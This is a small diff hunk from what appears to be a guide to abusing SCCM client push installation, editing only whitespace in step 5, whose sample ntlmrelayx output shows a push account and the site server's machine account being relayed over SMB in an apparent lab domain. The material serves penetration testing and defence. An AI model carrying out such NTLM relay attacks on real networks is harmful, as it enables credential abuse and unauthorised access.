@@ -116,7 +116,7 @@ It is not possible to identify whether automatic site-wide client push installat
 5. After a few minutes (in a default configuration an "delta discovery" takes place every 5 minutes. shortly after authentication attempts should happen.), ntlmrelayx should receive a connection from the configured client push installation account(s) and the site server’s machine account:
     ```
     [*] Authenticating against smb://10.2.10.113 as SEVENKINGDOMS/SCCM_PUSH SUCCEEDED
-    [*] SOCKS: Adding SEVENKINGDOMS/SCCM_PUSH@10.2.10.113(445) to active SOCKS connection Enjoy 
+    [*] SOCKS: Adding SEVENKINGDOMS/SCCM_PUSH@10.2.10.113(445) to active SOCKS connection Enjoy
     [*] Authenticating against smb://10.2.10.15 as SEVENKINGDOMS/SCCM01$ SUCCEED
     [*] SOCKS: Adding SEVENKINGDOMS/SCCM01$@10.2.10.15(445) to active SOCKS connection. Enjoy
     socks
